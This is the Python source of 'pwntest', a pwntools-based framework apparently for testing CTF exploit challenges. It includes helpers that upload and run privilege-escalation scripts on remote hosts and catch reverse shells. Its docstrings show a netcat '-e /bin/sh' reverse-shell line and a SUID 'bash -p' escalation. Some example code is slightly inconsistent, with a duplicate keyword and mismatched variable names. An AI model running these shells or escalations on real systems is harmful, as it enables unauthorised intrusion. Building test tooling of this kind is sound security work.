"""

The pwntest class encapsulates all the functionality of pwntest. Depending
on the arguments supplied to the constructor, it will initialise all
relevent subclass objects.

For example, supplying a ``binary_path`` argument will initialise the
``BinaryAutomation`` class, which can be used to automate the testing of
a binary.

>>> import pwntest
>>> tester = pwntest.PwnTest(binary_path="./example_binary")

If you want to test a web challenge, you can supply the ``remote_target`` and
``port`` arguments, which will initialise the ``WebAutomation`` class.

>>> import pwntest
>>> tester = pwntest.PwnTest(remote_target="example.com", port=80)

Supplying the ``binary_path``, ``remote_target``, and ``port`` arguments will
initialise the ``BinaryAutomation`` and ``WebAutomation`` classes, but passes
the ``remote_target`` and ``port`` arguments to the ``BinaryAutomation`` class
object as well, since they may be required for connecting to a remote pwn
target.

------------------------------

"""

import os
import threading
import base64
import socket
import tempfile
import pwd

import pwnlib.context
import pwnlib.elf
import pwnlib.log
import pwnlib.replacements
import pwnlib.filesystem

import pwntest.modules.extended_gdb as extended_gdb
from pwntest.modules.binary import BinaryAutomation
from pwntest.modules.web import WebAutomation

from logging import Formatter
from logging import getLogger as logging_getLogger


class PwnTest:
    """
    PwnTest is the main class for pwntest. It initialises the other pwntest modules.
    """

    def __init__(self, remote_target: str = "", port: int = 0, binary_path: str = "", ssh: dict = None) -> None:
        """
        Initialise the PwnTest class.

        :param remote_target: IP address or hostname of the remote host
        :param port: The port the challenge is exposed on.
        :param ssh: A dictionary containing the following keys:
            user: The username to use for SSH
            - password: The password to use for SSH
            OR
            - keyfile: The path to the SSH keyfile to use
            - port: The port to use for SSH (default: 22)
        """
        self.remote_ip: str = remote_target
        self.remote_port: int = port
        tempfile.template = "/tmp/pwntest_"
        self.log: pwnlib.log.Logger = pwnlib.log.getLogger("pwntest")

        configure_logger()
        self.log.setLevel("DEBUG")
        pwnlib.log.getLogger("pwnlib").setLevel("WARNING")

        # TODO: Update this to something more elegant,
        #       where these are only initialised the first time they're used or something
        # Perhaps could use "isinstance" to check if the object has been initialised in the call function,
        # and if not initialise it.

        if binary_path:
            self.BinaryAutomation: BinaryAutomation = BinaryAutomation(binary_path=binary_path, ip=remote_target, port=port)
        else:
            self.BinaryAutomation = self._refuse_binary_init
        self.WebAutomation: WebAutomation = WebAutomation(rhost=remote_target, rport=port)
        self.extended_gdb = extended_gdb
        self.SSHAutomation: SSHAutomation

        if ssh:
            self.SSHAutomation = SSHAutomation(ip=remote_target, port=port, ssh=ssh)

    @staticmethod
    def _refuse_binary_init() -> None:
        """
        Refuse to use binary a class. Used when the binary path is not specified in the constructor.
        """
        raise NotImplementedError("is not initialised. Initialise it in the PwnTest constructor.")

    def assert_priv_esc(self, user: str, priv_script: str, conn) -> bool:
        """
        Asserts that a priv esc script can be used to escalate privileges on a host. Works with most of the pwnlib tubes.
        The priv esc script must be executable on the target machine. e.g a shell script, or elf that drops a shell etc.

        :param user: The elevated user to priv esc to.
        :param conn: A pwnlib.tubes.[process, sock, ssh] tube.
        :param priv_script: Path to the priv esc script on the local machine. Does not need to be a particular file type, but must be able to run on the target machine.
        :return: True if the priv esc script worked, False otherwise.

        :Example:

        >>> with open("/tmp/priv.sh", "wt") as f:
        >>>     f.write("bash -p\\n") # if bash on the target is SUID
        >>> assert tester.assert_priv_esc("root", "/tmp/priv.sh", tester.SSHAutomation.ssh)
        True



        """
        proc = None
        if not os.path.exists(priv_script):
            self.log.error("Priv esc file does not exist. Skipping priv esc test.")
            return False

        file_name: str = os.path.basename(priv_script)

        # don't really need to do anything for this one, but check its executable
        if isinstance(conn, pwnlib.tubes.process.process):
            pass

        # upload the priv esc script to the remote host using the pwnlib.ssh module
        elif isinstance(conn, pwnlib.tubes.ssh.ssh):
            if not self.SSHAutomation.ssh:
                self.log.warning("SSH connection not established. Skipping priv esc test.")
                return False

            if not conn.connected():
                self.log.warning("SSH connection not established. Skipping priv esc test.")
                return False

            conn.upload(priv_script, f"/tmp/{file_name}")
            if not self.SSHAutomation.assert_file_exists(f"/tmp/{file_name}"):
                self.log.warning("Failed to upload priv esc script. Skipping priv esc test.")
                return False

            proc = conn.run(b"sh")

        # upload the file by encoding it in base64 and decoding it on the remote host
        # TODO: Test this works for huge files
        elif isinstance(conn, pwnlib.tubes.sock.sock):
            with open(priv_script, "rb") as f:
                data = f.read()
                encoded_data = base64.b64encode(data)
                conn.sendline(b"echo -ne '" + encoded_data + f"' | base64 -d > /tmp/{file_name}".encode())
                proc = conn
        else:
            self.log.error("Unsupported connection type")
            return False

        proc.sendline(f"chmod +x /tmp/{file_name}".encode())
        proc.sendline(f"/tmp/{file_name}".encode())
        proc.clean(timeout=1)
        proc.sendline(b"id")
        output = proc.clean(timeout=1)
        print(output)

        if (user.encode() if isinstance(user, str) else user) in output:
            self.log.debug("Priv esc seemed to work")
            return True
        else:
            self.log.debug("Priv esc failed")
            return False

    def run_reverse_shell_exploit(self, local_host, local_port, exploit_function, timeout: float = 5, **kwargs) -> pwnlib.tubes.listen.listen or None:
        """
        Runs an exploit function and listens for a reverse shell connection in a separate thread.

        :param timeout: The timeout for the listener
        :param local_host: The local interface to listen on
        :param local_port: The local port to listen on
        :param exploit_function: A Python function object. Must take arguments `local_host`, `local_port`, and any `**kwargs`
        :param kwargs: Any additional arguments to pass through to the exploit function
        :return: A pwnlib.tubes.listen.listen object if a connection was made, None otherwise

        :Example:

        .. code-block:: python

            def exploit(rhost, rport, lhost, lport):
                send_payload(f"nc {remote_host} {rport} -e /bin/sh")

            shell = tester.run_reverse_shell_exploit(lhost, lport,
                                                exploit_function=exploit_code,
                                                rhost=rhost,
                                                rhost=rport,
                                                lhost=lhost,
                                                lport=lport)
            shell.interactive()

        """

        socket_details: dict = {}

        # create a listener thread
        listener_thread = threading.Thread(target=self.run_socket_listener, args=("0.0.0.0", local_port, socket_details, timeout))
        listener_thread.start()

        pwnlib.replacements.sleep(2)
        # create thread to run the exploit function
        exploit_thread = threading.Thread(
            target=exploit_function,
            args=(local_host, local_port,),
            kwargs=kwargs
        )
        exploit_thread.start()

        listener_thread.join()  # wait for the listener to connect or timeout
        if socket_details:  # if there are details, a connection was made
            conn = pwnlib.tubes.remote.remote(
                socket_details["host"],
                socket_details["port"],
                fam=socket_details["fam"],
                typ=socket_details["type"],
                sock=socket_details["conn"]
            )
            self.log.success("Upgraded to full pwntools connection")
        else:
            conn = None
            self.log.warning("Could not establish a connection to the remote host")

        return conn

    def run_socket_listener(self, listener_host: str, listener_port: int, socket_details: dict, timeout: float = 5.0) -> None:
        """
        Listens for a connection on a given host and port. If a connection is made, the socket details are stored in the
        socket_details dictionary. This routine was designed to be used by the ``run_reverse_shell_exploit`` method,
        but can be used independently as well.

        :param listener_host: The local interface to listen on
        :param listener_port: The local port to listen on
        :param socket_details: A dictionary to store the socket details in.
        :param timeout: The timeout for the socket listener
        :return: None
        """

        # begin with raw sockets, as the pwnlib.remote implementation
        # blocks the thread until a connection is made
        with self.log.progress("Waiting for connection") as progress:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(timeout)
            try:
                sock.bind((listener_host, listener_port))
            except socket.error as error:
                self.log.warning("Failed due to %s", error)
                return

            try:
                sock.listen(1)
                conn, addr = sock.accept()
                sock.settimeout(None)
                progress.success(f"Raw socket connected by {addr}")
                # pass the connection back to the main thread
                socket_details["host"], socket_details["port"] = addr
                socket_details["fam"] = conn.family
                socket_details["type"] = conn.type
                socket_details["conn"] = conn
            except TimeoutError:
                progress.failure("Failed due to timeout")
        return

    @staticmethod
    def assert_remote_connected(tube: pwnlib.tubes.remote.remote) -> bool:
        """
        Occasionally, a shell can connect with the listener and then be dropped/killed
        on the remote side. For example by antivirus. This function sanity checks
        the shell by just attempting to run a command.

        :param tube: A pwntools remote tube object
        :return: True if the shell is still alive, False otherwise
        """
        tube.sendline(b"echo FOOBAR")
        return tube.connected()


class SSHAutomation:
    """
    Common functions for SSH test automation
    TODO:
        - Clean up these functions
    """
    log = pwnlib.log.getLogger("pwntest")

    def __init__(self, ip: str, port: int, ssh: dict) -> None:
        """
        Initializes the SSHAutomation class

        :param ip:
        :param port:
        :param ssh:
        """
        super().__init__()
        self.remote_ip: str = ip
        self.remote_port: int = port
        self.ssh: pwnlib.tubes.ssh.ssh
        self.log_level: str = "WARNING"

        if "user" not in ssh:
            raise ValueError("SSH User not provided")
        if "port" not in ssh:
            ssh["port"] = 22

        if "password" not in ssh and "keyfile" not in ssh:
            raise "SSH Password or Keyfile not provided"

        if "password" in ssh and "keyfile" in ssh:
            self.ssh = self.connect_ssh(ip=ip, port=ssh["port"], user=ssh["user"], password=ssh["password"], keyfile=ssh["keyfile"])
        elif "password" in ssh:
            self.ssh = self.connect_ssh(ip=ip, port=ssh["port"], user=ssh["user"], password=ssh["password"])
        elif "keyfile" in ssh:
            self.ssh = self.connect_ssh(ip=ip, port=ssh["port"], user=ssh["user"], keyfile=ssh["keyfile"])

    def download_remote_binary(self, remote_path: str, local_path: str) -> bool:
        """
        Downloads a remote file to the local machine

        :param remote_path: The remote path to the file
        :param local_path: The local path to save the file to
        :return: True if the file was downloaded, False otherwise
        """
        remote_file = pwnlib.filesystem.SSHPath(remote_path, ssh=self.ssh)
        if remote_file.exists:
            self.ssh.download_file(remote_path, local_path)
            return os.path.isfile(local_path)

    def assert_current_user(self, user: str) -> bool:
        """
        Confirms the current user is the expected user

        :param user: expected username
        :return: True if the current user is the expected user, False otherwise
        """
        if self.ssh.connected():
            return self.ssh.user == user

    def assert_file_exists(self, remote_path: str) -> bool:
        """
        Confirms a file exists on the remote host

        :param remote_path: Location of the expected file
        :return: True if the file exists, False otherwise
        """
        if self.ssh.connected():
            remote_file = pwnlib.filesystem.SSHPath(remote_path, ssh=self.ssh)
            return remote_file.exists()

    # def assert_file_owner(self, remote_path: str, user: str) -> bool:
    #     """
    #     Confirms the owner of a file is the expected user
    #
    #     :param remote_path: Location of the file
    #     :param user: Expected owner of the file
    #     :return: True if the file owner is the expected user, False otherwise
    #     """
    #     passed: bool = False
    #
    #     if not self.assert_file_exists(remote_path):
    #         return False
    #
    #     remote_file = pwnlib.filesystem.SSHPath(remote_path, ssh=self.ssh)
    #     owner_uid = remote_file.stat().st_uid
    #     owner = pwd.getpwuid(owner_uid)[0]
    #
    #     if remote_file.owner() == user:
    #         passed = True
    #     else:
    #         self.log.debug(f"File owner is '{remote_file.owner()}' not '{user}'")
    #
    #     return passed

    def assert_permissions(self, remote_path: str, perms: oct) -> bool:
        """
        Confirms the permissions of a file are the expected permissions

        :param remote_path: Location of the file
        :param perms: Expected permissions of the file
        :return: True if the file permissions are the expected permissions, False otherwise
        """
        passed: bool = False

        if not self.assert_file_exists(remote_path):
            return False

        remote_file = pwnlib.filesystem.SSHPath(remote_path, ssh=self.ssh)
        file_perms = remote_file.stat().st_mode & 0o777
        return file_perms == perms

    @classmethod
    def connect_ssh(cls, ip: str, port: int, user: str, password: str = "", keyfile: str = "") -> pwnlib.tubes.ssh.ssh:
        """
        Connect to a remote host via SSH.

        :param ip: IP address of the remote host
        :param port: Port of the remote host
        :param user: Username to connect with
        :param password: Password to connect with
        :param keyfile: Keyfile to connect with
        :return: A pwnlib ssh tube object
        """
        ssh: pwnlib.tubes.ssh.ssh

        cls.log.debug(f"Connecting to host {user}@{ip} on port {port}")
        if not password and not keyfile:
            raise ValueError("SSH Password or Keyfile not provided")

        elif password and not keyfile:
            ssh = pwnlib.tubes.ssh.ssh(user=user, host=ip, password=password, port=port, ignore_config=True)
        elif not password and keyfile:
            ssh = pwnlib.tubes.ssh.ssh(user=user, host=ip, keyfile=keyfile, port=port, level="WARNING", ignore_config=True)
        elif password and keyfile:
            ssh = pwnlib.tubes.ssh.ssh(user=user, host=ip, password=password, keyfile=keyfile, port=port, ignore_config=True)
        else:
            raise ValueError("Something went wrong with SSH Authentication")

        if not ssh.connected():
            raise ValueError("SSH Connection Failed")

        cls.log.info(f"Connected to SSH to remote: {ssh.distro} with remote PID {ssh.pid}")
        return ssh


# Copyright (c) 2015 Gallopsled et al.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
def configure_logger():
    """
    Configure the logger for pwntools. Identical to pwnlib.log.configure_logger
    used under MIT license.

    :return:
    """
    pwnlog = logging_getLogger("pwntest")
    if not pwnlog.handlers:
        iso_8601 = '%Y-%m-%dT%H:%M:%S'
        fmt = '%(asctime)s:%(levelname)s:%(name)s:%(message)s'
        log_file = pwnlib.log.LogfileHandler()
        log_file.setFormatter(Formatter(fmt, iso_8601))

        formatter = pwnlib.log.Formatter()
        console = pwnlib.log.Handler()
        console.setFormatter(formatter)

        pwnlog.addHandler(console)
        pwnlog.addHandler(log_file)
